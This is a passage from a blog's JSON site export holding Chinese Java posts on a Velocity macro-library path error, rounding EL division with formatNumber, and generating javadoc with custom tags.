class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"2-velocity-properties\"><a href=\"#2-velocity-properties\" class=\"headerlink\" title=\"2. velocity.properties\"></a>2. velocity.properties</h3><p>宏资源文件配置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">velocimacro.library=/WEB-INF/vm/macro.vm</div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h2 id=\"二、解析异常原因\"><a href=\"#二、解析异常原因\" class=\"headerlink\" title=\"二、解析异常原因\"></a>二、解析异常原因</h2><p>首先，默认velocity模板加载方式为file，对应的资源加载类为：<code>org.apache.velocity.runtime.resource.loader.FileResourceLoader</code>。参见如下 <strong>模板加载配置</strong> 以及 <strong>FileResourceLoader说明</strong> 。</p>\n<p>从模板目录/WEB-INF/vm/加载模块文件(<code>ResourceManagerImpl.getResource</code>)。</p>\n<p>如果模板文件没有缓存(<code>ResourceManagerImpl.globalCacheglobalCache</code>)，则从目录文件中加载(<code>ResourceManagerImpl.loadResource</code>)。</p>\n<p>加载过程中，加载资源文件流，解析并初始化。<code>org.apache.velocity.Template.process()</code><br>此时，调用资源文件加载类FileResourceLoader加载文件。</p>\n<p>FileResourceLoader在file.resource.loader.path目录，即spring-beans.xml中配置的resourceLoaderPath目录通过模板名查找并加载模板。<br>如果resourceLoaderPath未配置或者为空的话，则通过绝对路径加载模板；否则，相对于resourceLoaderPath查找模板。<br>如果resourceLoaderPath不为空，模板路径velocimacro.library以/开头，则直接去除/。</p>\n<h3 id=\"模板加载配置\"><a href=\"#模板加载配置\" class=\"headerlink\" title=\"模板加载配置\"></a>模板加载配置</h3><p>默认的velocity.properties in package <code>org.apache.velocity.runtime.defaults</code>。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">resource.loader = file</div><div class=\"line\"></div><div class=\"line\">file.resource.loader.description = Velocity File Resource Loader</div><div class=\"line\">file.resource.loader.class = org.apache.velocity.runtime.resource.loader.FileResourceLoader</div><div class=\"line\">file.resource.loader.path = .</div><div class=\"line\">file.resource.loader.cache = false</div><div class=\"line\">file.resource.loader.modificationCheckInterval = 2</div></pre></td></tr></table></figure></p>\n<h3 id=\"FileResourceLoader说明\"><a href=\"#FileResourceLoader说明\" class=\"headerlink\" title=\"FileResourceLoader说明\"></a>FileResourceLoader说明</h3><p>A loader for templates stored on the file system. Treats the template as relative to the configured root path. If the root path is empty treats the template name as an absolute path.</p>\n<h2 id=\"三、小结\"><a href=\"#三、小结\" class=\"headerlink\" title=\"三、小结\"></a>三、小结</h2><p>因此，对于当前的项目配置来说，velocity框架实际上是在/WEB-INF/vm/WEB-INF/vm/macro.vm目录加载模板文件macro.vm。</p>\n<p><strong>注</strong>：如果希望在class目录加载模板文件，可以考试设置资源文件加载类为：org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader。</p>\n<p>修改velocity.properties配置：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">resource.loader = class</div><div class=\"line\">class.resource.loader.class = org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader</div><div class=\"line\"></div><div class=\"line\">velocimacro.library=macro.vm</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/3443819/velocity-cant-find-resource\" target=\"_blank\" rel=\"external\">http://stackoverflow.com/questions/3443819/velocity-cant-find-resource</a><br><a href=\"http://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders\" target=\"_blank\" rel=\"external\">http://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders</a><br><a href=\"http://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html\" target=\"_blank\" rel=\"external\">http://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/velocity.png\" class=\"img-logo img-center\" /></p>\n<p>异常描述：VelocityException: Velocimacro : Error using VM library : /WEB-INF/vm/macro.vm<br>问题原因：路径配置错误。</p>\n<h2 id=\"一、项目相关配置\"><a href=\"#一、项目相关配置\" class=\"headerlink\" title=\"一、项目相关配置\"></a>一、项目相关配置</h2><h3 id=\"1-spring-beans-xml\"><a href=\"#1-spring-beans-xml\" class=\"headerlink\" title=\"1. spring-beans.xml\"></a>1. spring-beans.xml</h3><p>spring bean velocityEngine<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"velocityEngine\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.ui.velocity.VelocityEngineFactoryBean\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"resourceLoaderPath\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"/WEB-INF/vm/\"</span>/&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"configLocation\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"classpath:velocity.properties\"</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"2-velocity-properties\"><a href=\"#2-velocity-properties\" class=\"headerlink\" title=\"2. velocity.properties\"></a>2. velocity.properties</h3><p>宏资源文件配置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">velocimacro.library=/WEB-INF/vm/macro.vm</div></pre></td></tr></table></figure></p>","more":"<h2 id=\"二、解析异常原因\"><a href=\"#二、解析异常原因\" class=\"headerlink\" title=\"二、解析异常原因\"></a>二、解析异常原因</h2><p>首先，默认velocity模板加载方式为file，对应的资源加载类为：<code>org.apache.velocity.runtime.resource.loader.FileResourceLoader</code>。参见如下 <strong>模板加载配置</strong> 以及 <strong>FileResourceLoader说明</strong> 。</p>\n<p>从模板目录/WEB-INF/vm/加载模块文件(<code>ResourceManagerImpl.getResource</code>)。</p>\n<p>如果模板文件没有缓存(<code>ResourceManagerImpl.globalCacheglobalCache</code>)，则从目录文件中加载(<code>ResourceManagerImpl.loadResource</code>)。</p>\n<p>加载过程中，加载资源文件流，解析并初始化。<code>org.apache.velocity.Template.process()</code><br>此时，调用资源文件加载类FileResourceLoader加载文件。</p>\n<p>FileResourceLoader在file.resource.loader.path目录，即spring-beans.xml中配置的resourceLoaderPath目录通过模板名查找并加载模板。<br>如果resourceLoaderPath未配置或者为空的话，则通过绝对路径加载模板；否则，相对于resourceLoaderPath查找模板。<br>如果resourceLoaderPath不为空，模板路径velocimacro.library以/开头，则直接去除/。</p>\n<h3 id=\"模板加载配置\"><a href=\"#模板加载配置\" class=\"headerlink\" title=\"模板加载配置\"></a>模板加载配置</h3><p>默认的velocity.properties in package <code>org.apache.velocity.runtime.defaults</code>。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">resource.loader = file</div><div class=\"line\"></div><div class=\"line\">file.resource.loader.description = Velocity File Resource Loader</div><div class=\"line\">file.resource.loader.class = org.apache.velocity.runtime.resource.loader.FileResourceLoader</div><div class=\"line\">file.resource.loader.path = .</div><div class=\"line\">file.resource.loader.cache = false</div><div class=\"line\">file.resource.loader.modificationCheckInterval = 2</div></pre></td></tr></table></figure></p>\n<h3 id=\"FileResourceLoader说明\"><a href=\"#FileResourceLoader说明\" class=\"headerlink\" title=\"FileResourceLoader说明\"></a>FileResourceLoader说明</h3><p>A loader for templates stored on the file system. Treats the template as relative to the configured root path. If the root path is empty treats the template name as an absolute path.</p>\n<h2 id=\"三、小结\"><a href=\"#三、小结\" class=\"headerlink\" title=\"三、小结\"></a>三、小结</h2><p>因此，对于当前的项目配置来说，velocity框架实际上是在/WEB-INF/vm/WEB-INF/vm/macro.vm目录加载模板文件macro.vm。</p>\n<p><strong>注</strong>：如果希望在class目录加载模板文件，可以考试设置资源文件加载类为：org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader。</p>\n<p>修改velocity.properties配置：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">resource.loader = class</div><div class=\"line\">class.resource.loader.class = org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader</div><div class=\"line\"></div><div class=\"line\">velocimacro.library=macro.vm</div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/3443819/velocity-cant-find-resource\">http://stackoverflow.com/questions/3443819/velocity-cant-find-resource</a><br><a href=\"http://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders\">http://velocity.apache.org/engine/releases/velocity-1.6.4/developer-guide.html#Configuring_Resource_Loaders</a><br><a href=\"http://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html\">http://velocity.apache.org/engine/releases/velocity-1.6.4/apidocs/org/apache/velocity/runtime/resource/loader/ClasspathResourceLoader.html</a></p>"},{"title":"el数值运算取整","date":"2016-02-28T08:24:00.000Z","_content":"\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 取整\nel表达式除法结果为浮点型，无法通过运算直接得到整数值。\n通过formatNumber保留整除后0位有效小数即可。\n如下所示：\n``` xml\n<fmt:formatNumber type=\"number\" value=\"${8/7)}\" maxFractionDigits=\"0\"/>\n```\n\n## 参考文档\nhttp://blog.csdn.net/debbykindom/article/details/5854750","source":"_posts/article/java/el数值运算取整.md","raw":"title: el数值运算取整\ntags:\n  - el\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 16:24:00\n---\n\n<img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" />\n\n\n## 取整\nel表达式除法结果为浮点型，无法通过运算直接得到整数值。\n通过formatNumber保留整除后0位有效小数即可。\n如下所示：\n``` xml\n<fmt:formatNumber type=\"number\" value=\"${8/7)}\" maxFractionDigits=\"0\"/>\n```\n\n## 参考文档\nhttp://blog.csdn.net/debbykindom/article/details/5854750","slug":"article/java/el数值运算取整","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxrz00375nbta7gyb9ou","content":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"取整\"><a href=\"#取整\" class=\"headerlink\" title=\"取整\"></a>取整</h2><p>el表达式除法结果为浮点型，无法通过运算直接得到整数值。<br>通过formatNumber保留整除后0位有效小数即可。<br>如下所示：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">fmt:formatNumber</span> <span class=\"attr\">type</span>=<span class=\"string\">\"number\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"$&#123;8/7)&#125;\"</span> <span class=\"attr\">maxFractionDigits</span>=<span class=\"string\">\"0\"</span>/&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://blog.csdn.net/debbykindom/article/details/5854750\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/debbykindom/article/details/5854750</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"取整\"><a href=\"#取整\" class=\"headerlink\" title=\"取整\"></a>取整</h2><p>el表达式除法结果为浮点型，无法通过运算直接得到整数值。<br>通过formatNumber保留整除后0位有效小数即可。<br>如下所示：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">fmt:formatNumber</span> <span class=\"attr\">type</span>=<span class=\"string\">\"number\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"$&#123;8/7)&#125;\"</span> <span class=\"attr\">maxFractionDigits</span>=<span class=\"string\">\"0\"</span>/&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://blog.csdn.net/debbykindom/article/details/5854750\">http://blog.csdn.net/debbykindom/article/details/5854750</a></p>\n"},{"title":"生成javadoc文档","date":"2016-03-11T10:33:00.000Z","_content":"\n<img src=\"/asserts/images/logo/java.png\" class=\"img-logo img-center\" />\n\n\n## 一、查看javadoc帮助文档\n\n``` bash\nyerba-buena:~ yeshaoting$ javadoc --help\njavadoc: 错误 - 无效的标记: --help\n用法: javadoc [options] [packagenames] [sourcefiles] [@files]\n  -overview <file>                 从 HTML 文件读取概览文档\n  -public                          仅显示 public 类和成员\n  -protected                       显示 protected/public 类和成员 (默认值)\n  -package                         显示 package/protected/public 类和成员\n  -private                         显示所有类和成员\n  -help                            显示命令行选项并退出\n  -doclet <class>                  通过替代 doclet 生成输出\n  -docletpath <path>               指定查找 doclet 类文件的位置\n  -sourcepath <pathlist>           指定查找源文件的位置\n  -classpath <pathlist>            指定查找用户类文件的位置\n  -cp <pathlist>                   指定查找用户类文件的位置\n  -exclude <pkglist>               指定要排除的程序包列表\n  -subpackages <subpkglist>        指定要递归加载的子程序包\n  -breakiterator                   计算带有 BreakIterator 的第一个语句\n  -bootclasspath <pathlist>        覆盖由引导类加载器所加载的\n                                   类文件的位置\n  -source <release>                提供与指定发行版的源兼容性\n  -extdirs <dirlist>               覆盖所安装扩展的位置\n  -verbose                         输出有关 Javadoc 正在执行的操作的信息\n  -locale <name>                   要使用的区域设置, 例如 en_US 或 en_US_WIN\n  -encoding <name>                 源文件编码名称\n  -quiet                           不显示状态消息\n  -J<flag>                         直接将 <flag> 传递到运行时系统\n  -X                               输出非标准选项的提要\n\n通过标准 doclet 提供:\n  -d <directory>                   输出文件的目标目录\n  -use                             创建类和程序包用法页面\n  -version                         包含 @version 段\n  -author                          包含 @author 段\n  -docfilessubdirs                 递归复制文档文件子目录\n  -splitindex                      将索引分为每个字母对应一个文件\n  -windowtitle <text>              文档的浏览器窗口标题\n  -doctitle <html-code>            包含概览页面的标题\n  -header <html-code>              包含每个页面的页眉文本\n  -footer <html-code>              包含每个页面的页脚文本\n  -top    <html-code>              包含每个页面的顶部文本\n  -bottom <html-code>              包含每个页面的底部文本\n  -link <url>                      创建指向位于 <url> 的 javadoc 输出的链接\n  -linkoffline <url> <url2>        利用位于 <url2> 的程序包列表链接至位于 <url> 的文档\n  -excludedocfilessubdir <name1>:.. 排除具有给定名称的所有文档文件子目录。\n  -group <name> <p1>:<p2>..        在概览页面中, 将指定的程序包分组\n  -nocomment                       不生成说明和标记, 只生成声明。\n  -nodeprecated                    不包含 @deprecated 信息\n  -noqualifier <name1>:<name2>:... 输出中不包括指定限定符的列表。\n  -nosince                         不包含 @since 信息\n  -notimestamp                     不包含隐藏时间戳\n  -nodeprecatedlist                不生成已过时的列表\n  -notree                          不生成类分层结构\n  -noindex                         不生成索引\n  -nohelp                          不生成帮助链接\n  -nonavbar                        不生成导航栏\n  -serialwarn                      生成有关 @serial 标记的警告\n  -tag <name>:<locations>:<header> 指定单个参数定制标记\n  -taglet                          要注册的 Taglet 的全限定名称\n  -tagletpath                      Taglet 的路径\n  -charset <charset>               用于跨平台查看生成的文档的字符集。\n  -helpfile <file>                 包含帮助链接所链接到的文件\n  -linksource                      以 HTML 格式生成源文件\n  -sourcetab <tab length>          指定源中每个制表符占据的空格数\n  -keywords                        使程序包, 类和成员信息附带 HTML 元标记\n  -stylesheetfile <path>           用于更改生成文档的样式的文件\n  -docencoding <name>              指定输出的字符编码\n```\n\n<!-- more -->\n\n## 二、命令举例\n\n``` bash\n# 输出所有cn.yeshaoting.jvwa包及子包\njavadoc cn.yeshaoting.jvwa * -subpackages * -d ~/doc\n\n# 输出所有cn.yeshaoting.jvwa下指定子包\njavadoc cn.yeshaoting.jvwa * -subpackages cn.yeshaoting.jvwa.web cn.yeshaoting.jvwa.util -d ~/doc\n\n# 输出所有cn.yeshaoting.jvwa下 package/protected/public 类和成员(默认值 -protected：只显示 protected/public 类和成员)\njavadoc cn.yeshaoting.jvwa * -package -d ~/doc\n```\n\n\n## 三、自定义标签\n自定义标签输出到javadoc文档中，可以通过参数-tag来完成。\njavadoc帮助文档说明如下：\n> `-tag <name>:<locations>:<header> 指定单个参数定制标记`\n\n其中，name表示标签名称，locations表示处理标签所在的位置，header表示标签显示名。\n另外，locations官方解释如下：\n> Placement of tags - The Xaoptcmf part of the argument determines where in the source code the tag is allowed to be placed, and whether the tag can be disabled (using X). You can supply either a, to allow the tag in all places, or any combination of the other letters:\nX (disable tag)\na (all)\no (overview)\np (packages)\nt (types, that is classes and interfaces)\nc (constructors)\nm (methods)\nf (fields)\n\n一般地，直接使用a即可。\n\n\n### 举例\n``` bash\njavadoc cn.yeshaoting.jvwa * -tag \"api.name\":a:\"接口名：\" -tag \"api.apiId\":a:\"api id：\" -tag \"api.description\":a:\"接口描述：\" -tag \"api.category\":a:\"所属应用：\" -tag \"api.param\":a:\"参数：\" -tag \"api.result\":a\"返回结果：\" -tag \"api.requestExample\":a:\"请求实例：\" -tag \"api.responseExample\":a:\"响应实例：\" -tag \"api.errorExample\":a:\"错误实例：\" -d ~/doc\n```\n**注**：程序中标签声明形如：@api.name，@api.description，@datetime。\n\n\n## 四、生成chm文档\n可参考：[Javadoc转换chm帮助文档的四种方法总结](http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551)\n\n\n## 五、参考文档\n- [如何个性化地生成Javadoc文档](http://www.blogjava.net/lishunli/archive/2010/01/12/309218.html)\n- [如何自动生成javadoc及添加自定义标签 ](http://blog.sina.com.cn/s/blog_6e371452010177dj.html)\n- [多模块Maven项目如何使用javadoc插件生成文档](http://blog.csdn.net/jianxin1009/article/details/35269501)\n- [Javadoc转换chm帮助文档的四种方法总结](http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551)\n","source":"_posts/article/java/生成javadoc文档.md","raw":"title: 生成javadoc文档\ntags:\n  - javadoc\n  - java\ncategories:\n  - 后端开发\ndate: 2016-03-11 18:33:00\n---\n\n<img src=\"/asserts/images/logo/java.png\" class=\"img-logo img-center\" />\n\n\n## 一、查看javadoc帮助文档\n\n``` bash\nyerba-buena:~ yeshaoting$ javadoc --help\njavadoc: 错误 - 无效的标记: --help\n用法: javadoc [options] [packagenames] [sourcefiles] [@files]\n  -overview <file>                 从 HTML 文件读取概览文档\n  -public                          仅显示 public 类和成员\n  -protected                       显示 protected/public 类和成员 (默认值)\n  -package                         显示 package/protected/public 类和成员\n  -private                         显示所有类和成员\n  -help                            显示命令行选项并退出\n  -doclet <class>                  通过替代 doclet 生成输出\n  -docletpath <path>               指定查找 doclet 类文件的位置\n  -sourcepath <pathlist>           指定查找源文件的位置\n  -classpath <pathlist>            指定查找用户类文件的位置\n  -cp <pathlist>                   指定查找用户类文件的位置\n  -exclude <pkglist>               指定要排除的程序包列表\n  -subpackages <subpkglist>        指定要递归加载的子程序包\n  -breakiterator                   计算带有 BreakIterator 的第一个语句\n  -bootclasspath <pathlist>        覆盖由引导类加载器所加载的\n                                   类文件的位置\n  -source <release>                提供与指定发行版的源兼容性\n  -extdirs <dirlist>               覆盖所安装扩展的位置\n  -verbose                         输出有关 Javadoc 正在执行的操作的信息\n  -locale <name>                   要使用的区域设置, 例如 en_US 或 en_US_WIN\n  -encoding <name>                 源文件编码名称\n  -quiet                           不显示状态消息\n  -J<flag>                         直接将 <flag> 传递到运行时系统\n  -X                               输出非标准选项的提要\n\n通过标准 doclet 提供:\n  -d <directory>                   输出文件的目标目录\n  -use                             创建类和程序包用法页面\n  -version                         包含 @version 段\n  -author                          包含 @author 段\n  -docfilessubdirs                 递归复制文档文件子目录\n  -splitindex                      将索引分为每个字母对应一个文件\n  -windowtitle <text>              文档的浏览器窗口标题\n  -doctitle <html-code>            包含概览页面的标题\n  -header <html-code>              包含每个页面的页眉文本\n  -footer <html-code>              包含每个页面的页脚文本\n  -top    <html-code>              包含每个页面的顶部文本\n  -bottom <html-code>              包含每个页面的底部文本\n  -link <url>                      创建指向位于 <url> 的 javadoc 输出的链接\n  -linkoffline <url> <url2>        利用位于 <url2> 的程序包列表链接至位于 <url> 的文档\n  -excludedocfilessubdir <name1>:.. 排除具有给定名称的所有文档文件子目录。\n  -group <name> <p1>:<p2>..        在概览页面中, 将指定的程序包分组\n  -nocomment                       不生成说明和标记, 只生成声明。\n  -nodeprecated                    不包含 @deprecated 信息\n  -noqualifier <name1>:<name2>:... 输出中不包括指定限定符的列表。\n  -nosince                         不包含 @since 信息\n  -notimestamp                     不包含隐藏时间戳\n  -nodeprecatedlist                不生成已过时的列表\n  -notree                          不生成类分层结构\n  -noindex                         不生成索引\n  -nohelp                          不生成帮助链接\n  -nonavbar                        不生成导航栏\n  -serialwarn                      生成有关 @serial 标记的警告\n  -tag <name>:<locations>:<header> 指定单个参数定制标记\n  -taglet                          要注册的 Taglet 的全限定名称\n  -tagletpath                      Taglet 的路径\n  -charset <charset>               用于跨平台查看生成的文档的字符集。\n  -helpfile <file>                 包含帮助链接所链接到的文件\n  -linksource                      以 HTML 格式生成源文件\n  -sourcetab <tab length>          指定源中每个制表符占据的空格数\n  -keywords                        使程序包, 类和成员信息附带 HTML 元标记\n  -stylesheetfile <path>           用于更改生成文档的样式的文件\n  -docencoding <name>              指定输出的字符编码\n```\n\n<!-- more -->\n\n## 二、命令举例\n\n``` bash\n# 输出所有cn.yeshaoting.jvwa包及子包\njavadoc cn.yeshaoting.jvwa * -subpackages * -d ~/doc\n\n# 输出所有cn.yeshaoting.jvwa下指定子包\njavadoc cn.yeshaoting.jvwa * -subpackages cn.yeshaoting.jvwa.web cn.yeshaoting.jvwa.util -d ~/doc\n\n# 输出所有cn.yeshaoting.jvwa下 package/protected/public 类和成员(默认值 -protected：只显示 protected/public 类和成员)\njavadoc cn.yeshaoting.jvwa * -package -d ~/doc\n```\n\n\n## 三、自定义标签\n自定义标签输出到javadoc文档中，可以通过参数-tag来完成。\njavadoc帮助文档说明如下：\n> `-tag <name>:<locations>:<header> 指定单个参数定制标记`\n\n其中，name表示标签名称，locations表示处理标签所在的位置，header表示标签显示名。\n另外，locations官方解释如下：\n> Placement of tags - The Xaoptcmf part of the argument determines where in the source code the tag is allowed to be placed, and whether the tag can be disabled (using X). You can supply either a, to allow the tag in all places, or any combination of the other letters:\nX (disable tag)\na (all)\no (overview)\np (packages)\nt (types, that is classes and interfaces)\nc (constructors)\nm (methods)\nf (fields)\n\n一般地，直接使用a即可。\n\n\n### 举例\n``` bash\njavadoc cn.yeshaoting.jvwa * -tag \"api.name\":a:\"接口名：\" -tag \"api.apiId\":a:\"api id：\" -tag \"api.description\":a:\"接口描述：\" -tag \"api.category\":a:\"所属应用：\" -tag \"api.param\":a:\"参数：\" -tag \"api.result\":a\"返回结果：\" -tag \"api.requestExample\":a:\"请求实例：\" -tag \"api.responseExample\":a:\"响应实例：\" -tag \"api.errorExample\":a:\"错误实例：\" -d ~/doc\n```\n**注**：程序中标签声明形如：@api.name，@api.description，@datetime。\n\n\n## 四、生成chm文档\n可参考：[Javadoc转换chm帮助文档的四种方法总结](http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551)\n\n\n## 五、参考文档\n- [如何个性化地生成Javadoc文档](http://www.blogjava.net/lishunli/archive/2010/01/12/309218.html)\n- [如何自动生成javadoc及添加自定义标签 ](http://blog.sina.com.cn/s/blog_6e371452010177dj.html)\n- [多模块Maven项目如何使用javadoc插件生成文档](http://blog.csdn.net/jianxin1009/article/details/35269501)\n- [Javadoc转换chm帮助文档的四种方法总结](http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551)\n","slug":"article/java/生成javadoc文档","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxs1003a5nbtv6z1yolc","content":"<p><img src=\"/asserts/images/logo/java.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、查看javadoc帮助文档\"><a href=\"#一、查看javadoc帮助文档\" class=\"headerlink\" title=\"一、查看javadoc帮助文档\"></a>一、查看javadoc帮助文档</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ javadoc --help</div><div class=\"line\">javadoc: 错误 - 无效的标记: --help</div><div class=\"line\">用法: javadoc [options] [packagenames] [sourcefiles] [@files]</div><div class=\"line\">  -overview &lt;file&gt;                 从 HTML 文件读取概览文档</div><div class=\"line\">  -public                          仅显示 public 类和成员</div><div class=\"line\">  -protected                       显示 protected/public 类和成员 (默认值)</div><div class=\"line\">  -package                         显示 package/protected/public 类和成员</div><div class=\"line\">  -private                         显示所有类和成员</div><div class=\"line\">  -help                            显示命令行选项并退出</div><div class=\"line\">  -doclet &lt;class&gt;                  通过替代 doclet 生成输出</div><div class=\"line\">  -docletpath &lt;path&gt;               指定查找 doclet 类文件的位置</div><div class=\"line\">  -sourcepath &lt;pathlist&gt;           指定查找源文件的位置</div><div class=\"line\">  -classpath &lt;pathlist&gt;            指定查找用户类文件的位置</div><div class=\"line\">  -cp &lt;pathlist&gt;                   指定查找用户类文件的位置</div><div class=\"line\">  -exclude &lt;pkglist&gt;               指定要排除的程序包列表</div><div class=\"line\">  -subpackages &lt;subpkglist&gt;        指定要递归加载的子程序包</div><div class=\"line\">  -breakiterator                   计算带有 BreakIterator 的第一个语句</div><div class=\"line\">  -bootclasspath &lt;pathlist&gt;        覆盖由引导类加载器所加载的</div><div class=\"line\">                                   类文件的位置</div><div class=\"line\">  -source &lt;release&gt;                提供与指定发行版的源兼容性</div><div class=\"line\">  -extdirs &lt;dirlist&gt;               覆盖所安装扩展的位置</div><div class=\"line\">  -verbose                         输出有关 Javadoc 正在执行的操作的信息</div><div class=\"line\">  -locale &lt;name&gt;                   要使用的区域设置, 例如 en_US 或 en_US_WIN</div><div class=\"line\">  -encoding &lt;name&gt;                 源文件编码名称</div><div class=\"line\">  -quiet                           不显示状态消息</div><div class=\"line\">  -J&lt;flag&gt;                         直接将 &lt;flag&gt; 传递到运行时系统</div><div class=\"line\">  -X                               输出非标准选项的提要</div><div class=\"line\"></div><div class=\"line\">通过标准 doclet 提供:</div><div class=\"line\">  <span class=\"_\">-d</span> &lt;directory&gt;                   输出文件的目标目录</div><div class=\"line\">  -use                             创建类和程序包用法页面</div><div class=\"line\">  -version                         包含 @version 段</div><div 